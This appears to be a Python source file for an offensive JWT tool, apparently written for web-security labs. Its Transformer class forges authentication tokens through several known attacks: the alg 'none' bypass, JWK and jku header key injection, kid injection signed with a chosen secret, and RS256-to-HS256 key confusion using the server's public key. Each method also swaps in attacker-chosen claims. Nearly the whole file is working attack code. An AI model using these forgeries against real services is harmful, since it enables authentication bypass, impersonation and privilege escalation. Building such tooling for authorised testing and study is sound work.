import json
from base64 import b64encode, b64decode
from jwcrypto import jwt, jwk, jws
from jwcrypto.common import json_encode


class Transformer:
    """ Class Transformer does manipulations with JWT tokens """

    jwt_token: jwt.JWT
    payload: dict = {}

    def __init__(self, jwt_token: str, body_replaced: dict = None):
        """
            Wrap JWT token (str) to jwt.JWT python object.
            should_replaced are values that we should update in the body of JWT when JWT would be signed.
        """

        if body_replaced is None:
            body_replaced = {}

        self.jwt_token = jwt.JWT(jwt=jwt_token)
        self.payload = body_replaced

    def _token_info(self) -> (dict, dict, str):
        """ Extract header, body and signature from JWT """

        header = json.loads(self.jwt_token.token.objects['protected'])
        claims = json.loads(self.jwt_token.token.objects['payload'].decode())
        signature = self.jwt_token.token.objects['signature']

        return header, claims, signature

    def _resign_token(self, key: jwk.JWK, header: dict, claims: dict) -> str:
        # Adding the payload to JWT body
        claims.update(self.payload)

        # Creating JWT
        ET = jwt.JWT(
            header=header,
            claims=claims,
            algs=[header['alg']]
        )

        # Signing JWT and serializing
        ET.make_signed_token(key)
        ST = ET.serialize()

        return ST

    def set_alg_none(self) -> str:
        """ Set alg=None """

        ALG_NONE = 'none'

        # Take jwt_token's header, body and old signature.
        header, claims, signature = self._token_info()

        # Replace header 'alg'
        header['alg'] = ALG_NONE

        # Make and sign new JWT.

        # Key is needed to sign JWT (even if 'alg' is None). So I create the key with length=0
        key = jwk.JWK(generate='oct', size=0)

        ST = self._resign_token(key, header, claims)

        return ST

    def key_injection(self, jwks_out=False, jku='https://example.com/.well-known/jwks.json') -> (str, str):
        """
            Sign JWT via my JWK and add information about JWK (public key) to JWT's header.
            If jwks_out set True the method returns a jwk set into second parameter
        """
        ALG_RS256 = 'RS256'

        key = jwk.JWK.generate(kty='RSA', size=4096, alg=ALG_RS256)

        # Prepare key info
        kid = key.thumbprint()
        public_key_dict = key.export(private_key=False)
        public_key_dict = json.loads(public_key_dict)

        public_key_dict['kid'] = kid

        # Take jwt_token's header, body and old signature.
        header, claims, signature = self._token_info()

        header['alg'] = ALG_RS256
        header['kid'] = kid

        jwks = None
        if jwks_out:
            # Set jku header and put jwks.json on our server
            # https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
            header['jku'] = jku
            jwks = json.dumps(
                {
                    'keys': [
                        public_key_dict
                    ]
                }
            )
        else:
            header['jwk'] = public_key_dict
        # I don't know what to do with the header

        ST = self._resign_token(key, header, claims)

        return ST, jwks

    def kid_injection_attack(self, kid: str, secret: str) -> str:
        """ Injecting custom kid value and signing JWT with the secret """
        ALG_HS256 = 'HS256'

        key = jwk.JWK(**{
            'kty': 'oct',
            'alg': ALG_HS256,
            'k': b64encode(secret.encode()).decode().replace('=', ''),
        })

        # Take jwt_token's header, body and old signature.
        header, claims, signature = self._token_info()
        header.update({
            'kid': kid,
            'alg': ALG_HS256,
        })

        ST = self._resign_token(key, header, claims)

        return ST

    def key_confusion_attack(self, public_key_b64: str = None, jwks: dict = None) -> str:
        """
            JWK — A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.
            /.well-known/jwks.json example
        """
        ALG_HS256 = 'HS256'

        # Preparing HS256 key
        if public_key_b64:
            k = public_key_b64.replace('=', '')
        elif jwks:
            """
                Example jwks.json:
                {
                    "keys": [
                        {
                            "kty": "RSA",
                            "e": "AQAB",
                            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
                            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
                        },
                        {
                            "kty": "RSA",
                            "e": "AQAB",
                            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
                            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
                        }
                    ]
                }
            """
            jwk_json = jwks['keys'][0]  # getting a first jwk from jwks.json
            jwk_public = jwk.JWK(**jwk_json)  # wrapping the jwk (json) to jwk.JWK object
            jwk_public_pem = jwk_public.export_to_pem()
            k = b64encode(jwk_public_pem).decode().replace('=', '')
        else:
            # smth wrong
            return ''

        key = jwk.JWK(**{
            'kty': 'oct',
            'alg': ALG_HS256,
            'k': k,
        })
        # Take jwt_token's header, body and old signature.
        header, claims, signature = self._token_info()
        header.update({
            'kid': None,
            'alg': ALG_HS256,
        })

        ST = self._resign_token(key, header, claims)

        return ST